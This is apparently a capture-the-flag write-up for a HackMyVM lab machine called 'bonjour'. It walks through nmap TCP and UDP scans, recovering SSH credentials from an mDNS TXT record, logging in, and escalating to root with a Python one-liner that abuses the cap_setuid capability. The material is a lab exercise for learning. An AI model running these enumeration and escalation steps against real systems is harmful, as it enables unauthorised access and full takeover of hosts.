# bonjour

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| bonjour | M0rPH3U5 | beginner | hackmyvm |

**Summary:** The bonjour machine presents a network service challenge where the TCP attack surface is limited to a single SSH port on port 22, but a UDP port scan reveals a Bonjour or mDNS service on port 5353. Running the nmap dns-service-discovery script against the mDNS port retrieves advertised service records, and the SSH service TXT record contains the username and password in cleartext as key value pairs: username=user and password=Aroipo902!. These credentials are used to establish an SSH session as the user account on a Debian GNU/Linux system. Post exploitation enumeration of file capabilities reveals that the Python 3.13 binary at /usr/bin/python3.13 has the cap_setuid capability set, which allows arbitrary manipulation of the process user ID. A short Python one-liner calling os.setuid(0) followed by os.system spawns a root shell, and both the user and root flags are retrieved directly from the filesystem.

---

## Reconnaissance

The assessment began with host discovery, TCP port scanning, and a critical UDP port sweep that uncovered the mDNS service vector.

1. A ping sweep was performed to identify active hosts on the 192.168.56.0/24 network:

```zsh
~/projects/labs/hmv                                                                                                  23:14:54  
❯ nmap -sn 192.168.56.0/24          
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 23:15 +0700  
Nmap scan report for 192.168.56.1  
Host is up (0.0016s latency).  
Nmap scan report for 192.168.56.100  
Host is up (0.0017s latency).  
Nmap scan report for 192.168.56.144  
Host is up (0.0020s latency).  
Nmap scan report for 192.168.56.145  
Host is up (0.0051s latency).  
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds  
```

2. A full TCP port scan was executed against the identified target at 192.168.56.144:

```zsh
~/projects/labs/hmv                                                                                                  23:15:56  
❯ ip=192.168.56.144                                 

~/projects/labs/hmv                                                                                                  23:16:10  
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip              
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 23:16 +0700  
Nmap scan report for 192.168.56.144  
Host is up (0.00024s latency).  
Not shown: 65534 closed tcp ports (conn-refused)  
PORT  STATE SERVICE  
22/tcp open  ssh  

Nmap done: 1 IP address (1 host up) scanned in 2.56 seconds  
```

The TCP scan revealed only a single open port, SSH on port 22.

3. Service version detection and script scanning were performed against the SSH port:

```zsh
~/projects/labs/hmv                                                                                                  23:16:23  
❯ nmap -p 22 -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 23:16 +0700  
Nmap scan report for 192.168.56.144  
Host is up (0.00077s latency).  

PORT  STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds  
```

With only SSH exposed on TCP, the assessment pivoted to UDP port scanning to uncover additional services.

4. A UDP top ports scan was performed using root privileges:

```zsh
~/projects/labs/hmv                                                                                                  23:20:01  
❯ sudo nmap -sU --top-ports 100 -T2 --max-retries 2 --scan-delay 0 --min-parallelism 10 --max-parallelism 50 $ip  
Warning: --min-parallelism and --max-parallelism are ignored with --scan-delay.  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 23:20 +0700  
Warning: 192.168.56.144 giving up on port because retransmission cap hit (2).  
Nmap scan report for 192.168.56.144  
Host is up (0.00049s latency).  
Not shown: 89 open|filtered udp ports (no-response)  
PORT      STATE  SERVICE  
123/udp   closed ntp  
139/udp   closed netbios-ssn  
1023/udp  closed unknown  
1027/udp  closed unknown  
1812/udp  closed radius  
3703/udp  closed adobeserver-3  
4444/udp  closed krb524  
5353/udp  open   zeroconf  
9200/udp  closed wap-wsp  
49186/udp closed unknown  
49192/udp closed unknown  
MAC Address: 08:00:27:35:A8:6C (Oracle VirtualBox virtual NIC)  

Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds
```

The UDP scan discovered an open mDNS (Bonjour) service on port 5353, which became the primary vector for credential recovery.

5. The nmap dns-service-discovery script was run against the mDNS port to enumerate advertised services:

```zsh
~/projects/labs/hmv                                                                                      23:24:29
❯ sudo nmap -sU -p 5353 --script=dns-service-discovery -T4 $ip
[sudo] password for setyanoegraha: 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 23:25 +0700
Nmap scan report for 192.168.56.144
Host is up (0.00024s latency).

PORT     STATE SERVICE
5353/udp open  zeroconf
| dns-service-discovery: 
|   22/tcp ssh: 
|     ipv4: 192.168.56.144
|     name: debian SSH
|     hostname: debian
|     TXT: 
|_      username=user password=Aroipo902!
MAC Address: 08:00:27:35:A8:6C (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
```

The mDNS service advertised an SSH service with a TXT record containing the cleartext credentials `username=user password=Aroipo902!`. This is a classic misconfiguration where sensitive authentication data is broadcast over the local network via Bonjour or mDNS service advertisement.

---

## Initial Access

### SSH Authentication with mDNS Disclosed Credentials

6. Using the credentials recovered from the mDNS TXT record, an SSH session was established:

```bash
/projects/labs/hmv                                                                                      23:25:58
❯ ssh user@$ip                                                
user@192.168.56.144's password: 
Linux debian 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr 29 11:53:47 2026 from 192.168.56.1

user@debian:~$ id;whoami;hostname
uid=1000(user) gid=1000(user) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
user
debian
```

Access was gained as the user account (UID 1000) on a Debian GNU/Linux system named debian. The credentials `user:Aroipo902!` were confirmed valid.

---

## Privilege Escalation

### Python cap_setuid Capability Exploitation

7. File capabilities were enumerated to identify potential privilege escalation vectors:

```bash
user@debian:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/python3.13 cap_setuid=ep
```

The Python 3.13 binary at `/usr/bin/python3.13` was found to have the `cap_setuid` capability set with effective and permitted flags (`ep`). This capability allows the Python process to arbitrarily change its user ID, including setting it to 0 (root), without requiring SUID root privileges.

8. The Python binary was exploited using a one-liner that calls os.setuid(0) to set the real user ID to root, followed by spawning a bash shell:

```bash
user@debian:~$ python3.13 -c 'import os; os.setuid(0); os.system("/bin/bash")'  
root@debian:~# su -  
root@debian:~# id;whoami;hostname  
uid=0(root) gid=0(root) groupes=0(root)  
root  
debian  
root@debian:~# cat /home/user/user.txt /root/root.txt   
87e...
799...
```

The Python `os.setuid(0)` call leveraged the `cap_setuid` capability to set the process real user ID to 0 (root). The subsequent `os.system("/bin/bash")` spawned a root shell. A `su -` established a clean login shell with `uid=0(root) gid=0(root)`, and both the user flag from `/home/user/user.txt` and the root flag from `/root/root.txt` were retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap TCP scanning identified only SSH on port 22, but a UDP top ports scan revealed an open mDNS or Bonjour service on port 5353.
2. **Vulnerability Discovery**: The nmap dns-service-discovery script retrieved the mDNS service advertisement, and the SSH service TXT record contained the cleartext credentials username=user and password=Aroipo902! broadcast over the local network.
3. **Exploitation**: The recovered credentials were used to establish an SSH session as the user account, gaining initial foothold on the Debian Linux system.
4. **Internal Enumeration**: File capability enumeration with getcap revealed that the Python 3.13 binary at /usr/bin/python3.13 had the cap_setuid capability set with effective and permitted flags, allowing arbitrary manipulation of the process user ID.
5. **Privilege Escalation**: A Python one-liner calling os.setuid(0) leveraged the cap_setuid capability to set the process user ID to root, and os.system spawned a root shell, allowing retrieval of both the user and root flags.
